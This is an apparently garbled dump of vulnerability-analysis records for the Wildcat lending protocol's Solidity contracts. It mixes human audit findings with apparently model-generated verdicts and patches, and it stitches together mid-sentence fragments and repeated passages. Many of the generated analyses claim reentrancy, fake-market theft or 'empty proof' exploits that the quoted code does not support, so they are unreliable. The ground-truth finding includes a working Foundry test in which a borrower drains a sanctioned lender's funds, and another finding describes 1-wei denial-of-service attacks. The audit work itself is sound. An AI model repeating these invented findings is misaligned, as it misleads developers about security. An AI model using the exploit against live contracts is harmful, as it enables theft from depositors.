The remaining unburned shares can then be used to steal assets deposited by other users.\n\nThe reason for this vulnerability is that the `executeWithdrawal` function uses `uint96` for burning shares, which may cause an underflow or overflow error if the number of shares to burn exceeds the maximum value that can be stored in 96 bits. This can lead to a situation where fewer shares are burnt than expected, resulting in the malicious user being able to withdraw more assets than they should have access to.\n\nTo mitigate this vulnerability, adjusting the withdrawal function to convert shares' data types correctly is necessary, ensuring the appropriate number of shares is burnt during the withdrawal process.",

i < markets.length; i++) {\n      address market = markets[i];\n      if (!_controlledMarkets.contains(market)) {\n        revert NotControlledMarket();\n      }\n      //@audit-info => Forwards the value of the `lender` argument, and depending on the `lender` address is found in the _authorizedLenders EnumerableSet.AddressSet, will be forwarded a true or false accordingly\n        //@audit => If the lender address is not found in the _authorizedLenders variable, it will forward a false to the Market::updateAccountAuthorization() function\n      WildcatMarket(market).updateAccountAuthorization(lender, _authorizedLenders.contains(lender));\n    }\n  }\n```\n\n> EnumerableSet.sol\n```solidity\nfunction contains(AddressSet storage set, address value) internal view returns (bool) {\n    //@audit-info => Calls the internal _contains()\n    //@audit-info => If the given value is found it will return true, otherwise it will return false!\n    return _contains(set._inner, bytes32(uint256(uint160(value))));\n}\n\n//@audit-info => The internal function will just return a true or false if the given value is in the set or not, but the tx won't be reverted!\n/**\n* @dev Returns true if the value is in the set. O(1).\n*/\nfunction _contains(Set storage set, bytes32 value) private view returns (bool) {\n    return set._indexes[value] != 0;\n}\n```\n\n> WildcatMarketConfig.sol\n```solidity\n  function updateAccountAuthorization(\n    address _account,\n    //@audit-info => For any account that is not registered in the `_authorizedLenders` of the Controller, this flag was set as false!\n    bool _isAuthorized\n  ) external onlyController nonReentrant {\n    MarketState memory state = _getUpdatedState();\n    //@audit-info => If the accountAddress is not registered in the storage, the approval role is set to Null\n    //@audit-info => If the account has been blacklisted, tx will revert!\n    Account memory account = _getAccount(_account);\n    if (_isAuthorized) {\n      account.approval = AuthRole.DepositAndWithdraw;\n    \n    //@audit => Any account not registered in the Controller will be assigned the WithdrawOnly role.\n    } else {\n      account.approval = AuthRole.WithdrawOnly;\n    }\n    _accounts[_account] = account;\n    _writeState(state);\n    emit AuthorizationStatusUpdated(_account, account.approval);\n  }\n```\n\n- So, at this point, the Lender has been able to move their MarketTokens to different accounts and to grant the WithdrawOnly Role to all of the accounts he wishes to.\n- Now they can decide to exit the Market by queuing and executing some withdrawal requests from the different accounts where the MarketTokens were moved, any of those accounts have now the WithdrawOnly Role and have a balance of MarketTokens, so, the Lender will be able to exit the market from any of those accounts.\n\n\n## Tools Used\nManual Audit\n\n## Recommended Mitigation Steps\n- The mitigation for this problem is very straight-forward, limiting the access to which entities can call the [`WildcatMarketController::updateLenderAuthorization()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L182-L190), either only allow the Borrower to call it, or create a type of withelist of valid actors who are capable of updating the lender's authorization on the Markets, in this way, the Lenders won't be capable of granting the WithdrawOnly Role to any account they want to, thus, they won't be able even to attempt to escape the sanctions.\n\n> WildcatMarketController.sol\n```solidity\n- function updateLenderAuthorization(address lender, address[] memory markets) external {\n+ function updateLenderAuthorization(address lender, address[] memory markets) external onlyAuthorizedEntities(){\n    for (uint256 i; i < markets.length; i++) {\n      address market = markets[i];\n      if (!_controlledMarkets.contains(market)) {\n        revert NotControlledMarket();\n      }\n      WildcatMarket(market).updateAccountAuthorization(lender, _authorizedLenders.contains(lender));\n    }\n  }\n\nmodifier onlyAuthorizedEntities() {\n    require(msg.sender == <authorizedEntities>, \"you are not allowed sir\");\n    _;\n}\n```\n\n\n## Assessed type\n\nContext",

This allows the untrusted user to potentially manipulate the state of other users' accounts and gain access to their funds or assets.\n\nTo exploit this vulnerability, an attacker could simply call the `updateAccountAuthorization` function with a malicious account address as the first parameter, which would allow them to update the authorization status of any other account on the Wildcat platform. This could potentially lead to a situation where the attacker can drain a victim's assets or gain unauthorized access to their funds.\n\nTo mitigate this vulnerability, it is recommended that the `updateAccountAuthorization` function be modified to only allow trusted parties (such as the Wildcat platform itself) to call it, and that proper authorization checks are implemented to ensure that only authorized users can update other user's accounts.",

The reason for this vulnerability is that the function `updateLenderAuthorization` takes an array of markets as a parameter, but it does not properly verify the ownership or authorization of each market in the array before calling the `updateAccountAuthorization` method on the corresponding WildcatMarket contract.\n\nHere's why:\n\n1. The `updateLenderAuthorization` function first checks if the market is contained in the `_controlledMarkets` set. However, this check only ensures that the market is a controlled market and does not verify that the user has permission to modify the authorization of lenders for that market.\n2. The function then calls the `updateAccountAuthorization` method on each market, passing the `lender` address as a parameter. However, it does not check if the `lender` address is authorized to update the account authorization for the corresponding WildcatMarket contract.\n3. An attacker can exploit this vulnerability by providing a malicious `market` address in the array of markets passed to the `updateLenderAuthorization` function. If that market address has been compromised or if the user who owns that market has granted permission to the attacker, then the attacker can update the account authorization for that WildcatMarket contract on behalf of a different user (e.g., the victim).\n\nTo fix this vulnerability, you should add additional checks to ensure that each market in the array is owned by the user who calls the `updateLenderAuthorization` function and that the `lender` address is authorized to update the account authorization for the corresponding WildcatMarket contract. You can achieve this by adding a new `owner` parameter to the `updateAccountAuthorization` method and checking that the current user is the owner of each market before updating the account authorization.",

This type of vulnerability occurs when an external contract can call the smart contract repeatedly and cause it to spend excessive computational resources or send excessive amounts of funds.\n\nThe reason for this vulnerability is that the `updateLenderAuthorization` function takes in an array of market addresses as an input parameter. However, the function does not check if these addresses are actually legitimate Marketplaces within the protocol. Instead, it blindly iterates over the array and calls the `WildcatMarket` contract's `updateAccountAuthorization` function with each address in the array. This allows an attacker to provide a malicious market address that is not actually part of the protocol, causing the smart contract to waste computational resources and potentially send funds to a malicious account.\n\nTo mitigate this vulnerability, the smart contract code should include additional checks to ensure that only legitimate Marketplaces within the protocol can be authorized. This could involve maintaining a list of approved market addresses and checking if the addresses provided in the input array are actually on this list before calling the `WildcatMarket` contract's `updateAccountAuthorization` function with each address.",

This allows an attacker to create a fraudulent market (e.g., \"Fake Market B\") and provide it as input to the function, allowing the attacker to transfer assets from the user's account to their own account.\n\nTo mitigate this vulnerability, a validation mechanism should be implemented in the `updateLenderAuthorization` function that checks whether the provided market addresses are legitimate and authorized markets within the protocol before proceeding with the update operation. This can be done by maintaining a registry of approved market addresses within the protocol and checking against it before calling the `updateAccountAuthorization` function on any market.\n\nHere is an example patch that adds a validation mechanism to the `updateLenderAuthorization` function:\n```solidity\nfunction updateLenderAuthorization(address lender, address[] memory markets) external {\n    for (uint256 i; i < markets.length; i++) {\n        // Check if market is legitimate and authorized\n        require(_isValidMarketAddress(markets[i]), \"Invalid market address\");\n        WildcatMarket(markets[i]).updateAccountAuthorization(lender, _authorizedLenders.contains(lender));\n    }\n}\n```\nThe patch first checks if the provided market address is legitimate and authorized using the `_isValidMarketAddress` function, which can be implemented to check against a registry of approved market addresses within the protocol. If the address is not legitimate or authorized, the function reverts with an error message indicating that the input address is invalid.\n\nThis patch mitigates the vulnerability by ensuring that only legitimate and authorized markets can be updated by the `updateLenderAuthorization` function, preventing unauthorized asset transfer attacks.",

The reason for this is that the `updateAccountAuthorization` function in the `WildcatMarket` contract allows an actor with authorization to update an account's authorization status, which could potentially lead to unauthorized access or manipulation of a user's assets or market positions.\n\nThe vulnerability arises from the fact that the `updateLenderAuthorization` function in the `LoanMarket` contract allows a caller with authorization to delegate permission to update the authorization status of other accounts on behalf of the lenders in `_authorizedLenders`. However, this delegation mechanism is not properly implemented, as it does not ensure that only authorized actors can perform the action.\n\nTo exploit this vulnerability, an attacker could call the `updateLenderAuthorization` function with a list of market addresses and a lender address, and pass in false for the second parameter (which allows the attacker to update the authorization status of other accounts on behalf of the lenders). This would allow the attacker to update the authorization status of an account without proper authorization.\n\nTo fix this vulnerability, the `updateLenderAuthorization` function should include checks to verify that the caller has been granted permission to act on behalf of the original asset owner, operator, or contract, and that the actor is properly authorized to perform the specific action they attempt to perform on the user's assets or market positions.",

This is because the `updateLenderAuthorization` function of the smart contract does not perform any checks on the caller's authorization status before invoking the `updateAccountAuthorization` function of the `WildcatMarket` contract.\n\nTherefore, an authenticated but unauthorized actor could exploit this vulnerability to invoke sensitive operations on a user's assets or market positions without proper authorization. This could potentially lead to unintended and potentially malicious outcomes.\n\nTo patch this vulnerability, the `updateLenderAuthorization` function of the smart contract could be modified as follows:\n```solidity\nfunction updateLenderAuthorization(address lender, address[] memory markets) external {\n    require(_authorizedLenders.contains(msg.sender), \"Only authorized lenders can invoke this function\");\n\n    for (uint256 i; i < markets.length; i++) {\n      address market = markets[i];\n      if (!_controlledMarkets.contains(market)) {\n        revert NotControlledMarket();\n      }\n      WildcatMarket(market).updateAccountAuthorization(lender, _authorizedLenders.contains(lender));\n    }\n}\n```\nBy adding a `require` statement at the beginning of the function that checks if the caller is authorized to invoke this function, we ensure that only authorized lenders can update the authorization status of another user's assets or market positions on behalf of the original asset owner. This prevents an authenticated but unauthorized actor from exploiting this vulnerability and ensures that sensitive operations are only performed by authorized actors.\n\nNote that this patch is a potential solution to address the Improper Access Control on Delegated Contract Functions vulnerability type in the given smart contract code.

If there are multiple malicious lenders with different accounts calling the `updateLenderAuthorization` function simultaneously, each one can potentially trigger the re-entrancy attack on their own WildcatMarket contracts.\n5. The exploit could be further compounded by the fact that the smart contract code does not check whether the `lender` parameter passed to the `updateAccountAuthorization` function is the same as the `msg.sender` of the transaction, allowing the malicious lenders to call the function on behalf of other accounts.\n\nOverall, this vulnerability could potentially lead to a loss of funds for the borrower if not properly mitigated.

This is a potential vulnerability because it could allow a malicious actor to manipulate the authorization status of another user's account without proper authorization.\n\nTo exploit this vulnerability, an attacker could provide a parameter `_account` that references a different user's account. The function would then update the authorization status of the target user's account without properly verifying the identity of the caller or ensuring that only the owner of the account can modify its authorization status.\n\nTo address this vulnerability, the smart contract code could be modified to include additional authorization checks and ensure that only the owner of the account can update its authorization status. For example, the `updateAccountAuthorization` function could be updated to include a check that verifies that the caller is the owner of the account before updating its authorization status. Additionally, the function could also be updated to limit the ability of one user to act on behalf of another without explicit and verified consent for each specific action or set of actions.\n\nIn summary, based on the given vulnerability knowledge and the smart contract code provided, I would say that the smart contract is likely vulnerable to the \"Authorization Bypass Through User-Controlled Parameter\" vulnerability and recommend additional authorization checks and verification mechanisms to address this vulnerability.",

The `updateAccountAuthorization` function does not require authentication or validation checks for the caller's role before updating an account's authorization status.

The `_writeState` function is used to modify the state variable `state`, but it does not perform any validation checks on the updated state before writing it back to storage. This could lead to a situation where an unauthorized user can manipulate the state variable and cause unexpected behavior in the contract.\n3. The `_getAccount` function is used to retrieve an account's information, but it does not validate whether the requested account exists or has been authorized by the controller. This means that an unauthorized user could potentially request information about an account that they are not authorized to access.\n4.

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

This call to `WildcatSanctionsEscrow` occurs within the same transaction as the creation of the initial escrow contract, and it is not properly guarded against reentrancy attacks.\n\nIn particular, the `createEscrow` function does not include any check to ensure that the `tmpEscrowParams` variable has been initialized before calling `WildcatSanctionsEscrow`. This means that an attacker could potentially use a reentrancy attack to trigger the creation of a new escrow contract, and then modify the `tmpEscrowParams` variable in order to control the parameters passed to the newly created escrow contract.\n\nTo fix this vulnerability, the code should include a check to ensure that `tmpEscrowParams` has been initialized before calling `WildcatSanctionsEscrow`. For example, the code could be modified as follows:\n```\nif (tmpEscrowParams.borrower == address(0) || tmpEscrowParams.account == address(0) || tmpEscrowParams.asset == address(0)) {\n    revert(\"Invalid parameters\");\n}\nnew WildcatSanctionsEscrow{ salt: keccak256(abi.encode(tmpEscrowParams.borrower, tmpEscrowParams.account, tmpEscrowParams.asset)) }();\n```\nThis check would ensure that the `tmpEscrowParams` variable has been initialized before calling `WildcatSanctionsEscrow`, and it would also prevent an attacker from modifying the parameters passed to the newly created escrow contract.",

However, there is no check to ensure that these parameters are valid or that the borrower has permission to create an escrow for the specified account and asset. Therefore, an attacker could potentially use this vulnerability by providing invalid or unauthorized parameters in order to access assets that they do not have permission to access.\n\nFor example, the attacker could call the `createEscrow` function with a malicious `borrower` address and a valid `account` and `asset` addresses. The smart contract would then create an escrow for the specified account and asset, giving the attacker control over those assets without their permission.\n\nTo fix this vulnerability, we could add additional checks to ensure that only authorized users can create escrows for specific accounts and assets.

                "decompose": "  Based on the given smart contract code and vulnerability knowledge, we can analyze whether it is vulnerable or not.\n\nFirstly, let's summarize the functionality of the given code:\nThe `createEscrow` function creates an escrow contract for a specific borrower, account, and asset combination. It checks if the market that created the contract is registered using the `isRegisteredMarket` function from the `IWildcatArchController` interface. If it's not registered, it reverts with the `NotRegisteredMarket` error. The function then retrieves the escrow address for the given combination of borrower, account, and asset using the `getEscrowAddress` function.\nIf the retrieved escrow address has a codehash that is not zero, it means the contract already exists and returns the existing contract. Otherwise, it creates a new escrow contract by calling the `WildcatSanctionsEscrow` constructor with the salt of the given combination of borrower, account, and asset as a parameter. The function then emits two events: `NewSanctionsEscrow` and `SanctionOverride`.\nThe function also sets the boolean value for the given borrower and escrow contract in the `sanctionOverrides` mapping to true.\n\nNow, let's analyze whether the given code is vulnerable to the described vulnerability:\nThe vulnerability describes a situation where incorrect asset values are updated before withdrawals, leading to inaccurate reward calculations and potential underflows. The issue seems to affect the `createEscrow` function specifically, as it involves creating new escrow contracts for users. However, upon reviewing the code, we can see that there is no explicit update of asset values before withdrawals. In fact, the only place where asset values are used is in the `WildcatSanctionsEscrow` constructor, which receives the salt of the given combination of borrower, account, and asset as a parameter.\nTherefore, we cannot conclude that the given code is vulnerable to the described vulnerability based on the information provided. However, it's important to note that this vulnerability may exist elsewhere in the contract or the system as a whole and not be directly related to this specific function.",
                "poc_patch": "  Based on the given vulnerability knowledge and the smart contract code provided, it appears that there is a potential vulnerability in the `createEscrow` function. Specifically, this function creates an escrow contract for a borrower, account, and asset, but does not correctly update the total assets of the system before withdrawals. This could lead to inaccurate reward calculations and potential underflows, which could adversely impact other users in the system.\n\nThe vulnerability type is \"Incorrectly updating asset values before withdrawal,\" which could be a potential security risk for the smart contract. The reason for this assessment is that the `createEscrow` function creates an escrow contract but does not update the total assets of the system, which means that the reward calculations may be inaccurate and potentially lead to underflows.\n\nTo evaluate this vulnerability more thoroughly, it would be helpful to generate a Proof of Concept (PoC) or a patch to demonstrate how the smart contract could be exploited. For example, the PoC could show how an attacker could manipulate the `createEscrow` function to create escrow contracts with incorrect asset values, potentially leading to inaccurate reward calculations and underflows. The patch could address this vulnerability by ensuring that the total assets of the system are updated accurately before withdrawals, which would prevent the potential security risk.",

The smart contract will then return the address of the escrow contract for the given borrower and asset, which is stored in the `_escrows` mapping. The attacker can then use this reference to manipulate the state of the escrow contract, such as transferring tokens or modifying critical variables, by calling the `transfer` function with the address of the malicious account as the `from` parameter.\n\nTo mitigate this vulnerability, the smart contract developer should implement rigorous access control checks that authenticate and authorize user interactions with sensitive functions or objects, ensuring only entitled users can perform such actions. They should also validate all received object references in function calls against the caller's permissions, ensuring that a user can only interact with objects they are authorized to access.

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

However, the result of the multiplication can exceed the maximum value that can be stored in a 128-bit integer, leading to an overflow and potentially incorrect loss calculation.\n\nTo fix this vulnerability, it is recommended to use the SafeMath library from OpenZeppelin to perform the arithmetic operations safely. Alternatively, the function can be modified to use `uint256` instead of `uint128`, which will avoid any possibility of overflow issues.\n\nThe type of vulnerability is a potential loss calculation error due to an overflow attack. The reason for this vulnerability is that the multiplication operation in the code can exceed the maximum value that can be stored in a 128-bit integer, leading to incorrect loss calculation and potentially significant loss for users.",

The logic in the function assumes that all assets are available when the withdrawal is executed, but this is not always the case. If there are any locked funds in the strategy, it creates a gap between the requested and returned amount that isn't considered in the loss calculation. This can lead to incorrect loss calculation and significant loss for users.\n\nThe vulnerability is caused by the use of `MathUtils.mulDiv` function which doesn't properly handle the presence of temporarily locked or frozen assets. The result of this function is used to calculate the amount of funds that should be transferred to the user, but it does not take into account any temporary locking or freezing of the assets. This can lead to an incorrect calculation of the amount of funds that should be transferred and potentially lead to a loss of significant amounts of money for users.\n\nTo address this issue, it is important to modify the controlling logic to ensure that loss calculations take into account the initial value of the assets and to update shares according to the real value obtained during withdrawal.

The reason for this is because the `executeWithdrawal` function is using a scaling factor (represented by `status.scaledAmount`) to calculate the amount withdrawn from the pool. However, this scaling factor is not properly controlled, and it can lead to an inaccurate calculation of the withdrawal amount.\n\nThe vulnerability arises when the user requests a withdrawal that is greater than the available tokens in the pool. In this case, the `executeWithdrawal` function will try to calculate the actual amount withdrawn by scaling down the requested amount by the scaling factor. However, if the scaling factor is not properly controlled, it can lead to an incorrect calculation of the withdrawal amount, which can result in a situation where not enough tokens are withdrawn from the pool. This can cause issues in situations where the user relies on the accurate withdrawal of their assets from the pool.\n\nTo mitigate this vulnerability, it is recommended to modify the `executeWithdrawal` function to use a more accurate calculation method that takes into account the pool's share allocation and redemption mechanism. This can help ensure that the precise token amount requested by the user is withdrawn from the pool without any unexpected reverts or disruptions in subsequent operations.",
                "poc_patch": "  Yes, the given smart contract code is vulnerable to the \"Incorrect Token Withdrawal Calculation in Pool Exit Functions\" vulnerability. Here's why:\n\n1. The vulnerability lies in the `executeWithdrawal` function, which calculates the normalized amount withdrawn based on the scaled amount paid and the user's share of the pool. However, the calculation is performed using a factor derived from the pool's share price instead of directly using the intended withdrawal amount. This results in an incorrect, scaled-down value being used for the withdrawal request, which can lead to not enough tokens being withdrawn and potentially causing subsequent operations to fail.\n2. The vulnerability is mitigated by the `normalizedAmountWithdrawn` variable, which should be set based on the actual token amount needed rather than using a scaled factor. However, in this case, it is calculated based on the incorrect scaled value, leading to an inconsistency between the user's intended withdrawal amount and the actual amount withdrawn.\n3. The vulnerability can be exploited by a malicious actor by providing a fake expiration time that causes the `executeWithdrawal` function to revert. This can lead to a scenario where not enough tokens are withdrawn, potentially causing subsequent operations to fail.\n\nTo mitigate this vulnerability, the smart contract code should be modified to use the actual token amount needed rather than using a scaled factor in the withdrawal calculation. Additionally, the `normalizedAmountWithdrawn` variable should be set based on the correct token amount, rather than the incorrect scaled value.

The vulnerability is further exacerbated by the use of the `MathUtils` library in the smart contract. This library contains functions such as `mulDiv()` that can be used for arbitrary precision arithmetic operations. However, these functions are not designed to handle edge cases where the result may be larger than the expected range or may lead to a division-by-zero error.\n3. The vulnerability can be exploited by providing an empty proof with a minimum length of 0 bytes, which can cause the `revert` statements in the smart contract to fail silently and potentially execute malicious code.\n4. To mitigate this vulnerability, developers should implement proper validation checks for proof values, ensuring non-empty proofs and minimum length requirements are enforced to prevent exploitation.

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

        "gt": "\n# Vulnerability details\n\n## Impact\n\nThe `WildcatMarketBase#_blockAccount()` function that is used to block a sanctioned lender contains a critical bug. It incorrectly calls `IWildcatSanctionsSentinel(sentinel).createEscrow()` with misordered arguments, accidentially creating a vulnerable escrow that enables the borrower to drain all the funds of the sanctioned lender.\n\nThe execution of withdrawals (`WildcatMarketWithdrawals#executeWithdrawal()`) also performs a check if the the `accountAddress` is sanctioned and if it is, and escrow is created and the amount that was to be sent to the lender is sent to the escrow. That escrow, however, is also created with the `account` and `borrower` arguments in the wrong order. \n\nThat means wether or not the borrower has anything to do with a sanctioned account and their funds ever, that account will never be able to get their money back in case their sanction gets dismissed.\n\n## Proof of Concept\n\nConsider this scenario to illustrate how the issue can be exploited.\n\n1. Bob The Borrower creates a market.\n2. Bob authorizes Larry The Lender as a lender in the created market.\n3. Larry deposits funds into the market\n4. Larry gets sanctioned in Chainalysis\n5. Bob invokes `WildcatMarket#nukeFromOrbit(larryAddress)`, blocking Larry and creating a vulnerable `WildcatSanctionsEscrow` where Larry's market tokens are transferred.\n7. Bob authorizes himself as a lender in the market via `WildcatMarketController#authorizeLenders(bobAddress)` \n8. Bob initiates a withdrawal using  `WildcatMarket#queueWithdrawal()`\n9. After the withdrawal batch duration expires, Bob calls `WildcatMarket#executeWithdrawal()` - and gains access to all of Larry's assets.\n\nNow, let's delve into the specifics and mechanics of the vulnerability.\n\nThe `nukeFromOrbit()` function calls `_blockAccount(state, larryAddress)`, blocking Larry's account, creating an escrow, and transferring his market tokens to that escrow.\n\n```solidity\n//@audit                                                     Larry\n//@audit                                                       \u2193\nfunction _blockAccount(MarketState memory state, address accountAddress) internal {\n  Account memory account = _accounts[accountAddress];\n  // ...\n  account.approval = AuthRole.Blocked;\n  // ...\n  account.scaledBalance = 0;\n  address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(\n\taccountAddress, //@audit \u2190 Larry\n\tborrower,       //@audit \u2190 Bob\n\taddress(this)\n  );\n  // ...\n  _accounts[escrow].scaledBalance += scaledBalance;\n  // ...\n}\n```\n\nIn the code snippet, notice the order of arguments passed to `createEscrow()`:\n\n```solidity\ncreateEscrow(accountAddress, borrower, address(this));\n```\n\nHowever, when we examine the `WildcatSanctionsSentinel#createEscrow()` implementation, we see a different order of arguments. This results in an incorrect construction of `tmpEscrowParams`:\n\n```solidity\nfunction createEscrow(\n\taddress borrower, //@audit \u2190 Larry\n\taddress account,  //@audit \u2190 Bob\n\taddress asset\n) public override returns (address escrowContract) {\n  // ...\n  // @audit                        ( Larry  ,   Bob  , asset)\n  // @audit                            \u2193         \u2193       \u2193\n  tmpEscrowParams = TmpEscrowParams(borrower, account, asset);\n  new WildcatSanctionsEscrow{ salt: keccak256(abi.encode(borrower, account, asset)) }();\n  // ...\n}\n```\n\nThe `tmpEscrowParams` are essential for setting up the escrow correctly. They are fetched in the constructor of `WildcatSanctionsEscrow`, and the order of these parameters is significant:\n\n```solidity\nconstructor() {\n  sentinel = msg.sender;  \n  (borrower, account, asset) = WildcatSanctionsSentinel(sentinel).tmpEscrowParams();\n//     \u2191        \u2191       \u2191   \n//(  Larry ,   Bob  , asset) are the params fetched here. @audit\n}\n```\n\nHowever, due to the misordered arguments in `_blockAccount()`, what's passed as `tmpEscrowParams` is `(borrower = Larry, account = Bob, asset)`, which is incorrect. This misordering affects the `canReleaseEscrow()` function, which determines whether `releaseEscrow()` should proceed or revert:\n\n```solidity\nfunction canReleaseEscrow() public view override returns (bool) {\n\t//@audit                                                 Larry      Bob\n\t//                                                         \u2193         \u2193\n\treturn !WildcatSanctionsSentinel(sentinel).isSanctioned(borrower, account);\n}\n```\n\nThe misordered parameters impact the return value of `sentinel.isSanctioned()`. It mistakenly checks Bob against the sanctions list, where he is not sanctioned.\n\n```solidity\n//@audit                       Larry              Bob\n//                               \u2193                 \u2193\nfunction isSanctioned(address borrower, address account) public view override returns (bool) {\n return\n   !sanctionOverrides[borrower][account] && // true\n   IChainalysisSanctionsList(chainalysisSanctionsList).isSanctioned(account); // false\n}\n```\n\nThus `isSanctioned()` returns `false` and consequently `canReleaseEscrow()` returns `true`. This allows Bob to successfully execute `releaseEscrow()` and drain all of Larry's market tokens:\n\n```solidity\nfunction releaseEscrow() public override {\n  if (!canReleaseEscrow()) revert CanNotReleaseEscrow();\n\n  uint256 amount = balance();\n  \n  //@audit                 Bob   Larry's $\n  //                        \u2193       \u2193\n  IERC20(asset).transfer(account, amount);\n\n  emit EscrowReleased(account, asset, amount);\n}\n```\n\nAfter this, Bob simply needs to authorize himself as a lender in his own market and withdraw the actual assets.\n\nBelow is a PoC demonstrating how to execute the exploit.\n\nTo proceed, please include the following import statements in `test/market/WildcatMarketConfig.t.sol`:\n\n```solidity\nimport 'src/WildcatSanctionsEscrow.sol';\n\nimport \"forge-std/console2.sol\";\n```\n\nAdd the following test `test/market/WildcatMarketConfig.t.sol` as well:\n\n```solidity\nfunction test_borrowerCanStealSanctionedLendersFunds() external {\n  vm.label(borrower, \"bob\"); // Label borrower for better trace readability\n\n  // This is Larry The Lender\n  address larry = makeAddr(\"larry\");\n\n  // Larry deposists 10e18 into Bob's market\n  _deposit(larry, 10e18);\n\n  // Larry's been a bad guy and gets sanctioned\n  sanctionsSentinel.sanction(larry);\n\n  // Larry gets nuked by the borrower\n  vm.prank(borrower);\n  market.nukeFromOrbit(larry);\n\n  // The vulnerable escrow in which Larry's funds get moved\n  address vulnerableEscrow = sanctionsSentinel.getEscrowAddress(larry, borrower, address(market));\n  vm.label(vulnerableEscrow, \"vulnerableEscrow\");\n\n  // Ensure Larry's funds have been moved to his escrow\n  assertEq(market.balanceOf(larry), 0);\n  assertEq(market.balanceOf(vulnerableEscrow), 10e18);\n\n  // Malicious borrower is able to release the escrow due to the vulnerability\n  vm.prank(borrower);\n  WildcatSanctionsEscrow(vulnerableEscrow).releaseEscrow();\n\n  // Malicious borrower has all of Larry's tokens\n  assertEq(market.balanceOf(borrower), 10e18);\n\n  // The borrower authorizes himself as a lender in the market\n  _authorizeLender(borrower);\n\n  // Queue withdrawal of all funds\n  vm.prank(borrower);\n  market.queueWithdrawal(10e18);\n\n  // Fast-forward to when the batch duration expires\n  fastForward(parameters.withdrawalBatchDuration);\n  uint32 expiry = uint32(block.timestamp);\n\n  // Execute the withdrawal\n  market.executeWithdrawal(borrower, expiry);\n\n  // Assert the borrower has drained all of Larry's assets\n  assertEq(asset.balanceOf(borrower), 10e18);\n}\n```\n\nRun the PoC like this:\n\n```sh\nforge test --match-test test_borrowerCanStealSanctionedLendersFunds -vvvv\n```\n\n## Tools Used\n\nManual review\n## Recommended Mitigation Steps\n\n1.

